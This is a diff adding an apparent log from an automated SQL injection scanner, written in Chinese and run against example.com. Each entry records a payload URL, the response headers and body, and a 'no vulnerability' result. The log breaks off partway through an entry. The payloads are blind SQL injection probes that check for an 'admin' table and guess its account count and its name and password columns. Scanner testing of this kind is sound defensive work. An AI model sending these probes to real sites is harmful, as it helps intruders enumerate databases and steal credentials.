@@ -1,0 +1,1942 @@
+
+🔍 开始测试参数：id
+  → 测试 URL：https://example.com/?id=%3B+and+1%3D1+and+1%3D2&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3289', 'Date': 'Tue, 26 Aug 2025 14:48:21 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：; and 1=1 and 1=2，耗时：2.31s）
+  → 测试 URL：https://example.com/?id=and+0%3C%3E%28select+count%28%2A%29+from+%2A%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3284', 'Date': 'Tue, 26 Aug 2025 14:48:26 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 0<>(select count(*) from *)，耗时：4.89s）
+  → 测试 URL：https://example.com/?id=and+0%3C%3E%28select+count%28%2A%29+from+admin%29+--+%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8admin%E8%BF%99%E5%BC%A0%E8%A1%A8&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3284', 'Date': 'Tue, 26 Aug 2025 14:48:26 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 0<>(select count(*) from admin) -- 判断是否存在admin这张表，耗时：1.91s）
+  → 测试 URL：https://example.com/?id=--+1.%E7%8C%9C%E5%B8%90%E5%8F%B7%E6%95%B0%E7%9B%AE+%E5%A6%82%E6%9E%9C%E9%81%87%E5%88%B00%3C+%E8%BF%94%E5%9B%9E%E6%AD%A3%E7%A1%AE%E9%A1%B5%E9%9D%A2+1%3C%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E8%AF%B4%E6%98%8E%E5%B8%90%E5%8F%B7%E6%95%B0%E7%9B%AE%E5%B0%B1%E6%98%AF1%E4%B8%AA&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3281', 'Date': 'Tue, 26 Aug 2025 14:48:29 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：-- 1.猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个，耗时：2.15s）
+  → 测试 URL：https://example.com/?id=and+0%3C%28select+count%28%2A%29+from+admin%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3279', 'Date': 'Tue, 26 Aug 2025 14:48:31 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 0<(select count(*) from admin)，耗时：1.83s）
+  → 测试 URL：https://example.com/?id=and+1%3C%28select+count%28%2A%29+from+admin%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3278', 'Date': 'Tue, 26 Aug 2025 14:48:32 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1<(select count(*) from admin)，耗时：1.29s）
+  → 测试 URL：https://example.com/?id=--+2.%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0+%E5%9C%A8len%28+%29+%E6%8B%AC%E5%8F%B7%E9%87%8C%E9%9D%A2%E5%8A%A0%E4%B8%8A%E6%88%91%E4%BB%AC%E6%83%B3%E5%88%B0%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0.&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3276', 'Date': 'Tue, 26 Aug 2025 14:48:34 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：-- 2.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.，耗时：1.66s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%2A%29%3E0%29--&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3274', 'Date': 'Tue, 26 Aug 2025 14:48:36 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where len(*)>0)--，耗时：2.04s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%E7%94%A8%E6%88%B7%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0name%29%3E0%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3268', 'Date': 'Tue, 26 Aug 2025 14:48:42 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where len(用户字段名称name)>0)，耗时：5.99s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28_blank%3E%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0password%29%3E0%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3266', 'Date': 'Tue, 26 Aug 2025 14:48:44 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)，耗时：2.74s）
+  → 测试 URL：https://example.com/?id=--+3.%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0+%E5%9C%A8len%28+%29+%E6%8B%AC%E5%8F%B7%E9%87%8C%E9%9D%A2%E5%8A%A0%E4%B8%8A%E6%88%91%E4%BB%AC%E6%83%B3%E5%88%B0%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0.&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3264', 'Date': 'Tue, 26 Aug 2025 14:48:46 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：-- 3.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.，耗时：0.85s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%2A%29%3E0%29--&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3263', 'Date': 'Tue, 26 Aug 2025 14:48:47 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where len(*)>0)--，耗时：1.33s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%E7%94%A8%E6%88%B7%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0name%29%3E0%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3262', 'Date': 'Tue, 26 Aug 2025 14:48:48 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where len(用户字段名称name)>0)，耗时：1.67s）
+  → 测试 URL：https://example.com/?id=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28_blank%3E%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0password%29%3E0%29&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3260', 'Date': 'Tue, 26 Aug 2025 14:48:50 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：id，Payload：and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)，耗时：1.74s）
+  → 测试 URL：https://example.com/?id=--+4.%E7%8C%9C%E8%A7%A3%E5%AD%97%E7%AC%A6&name=test
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3256', 'Date': 'Tue, 26 Aug 2025 14:48:54 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
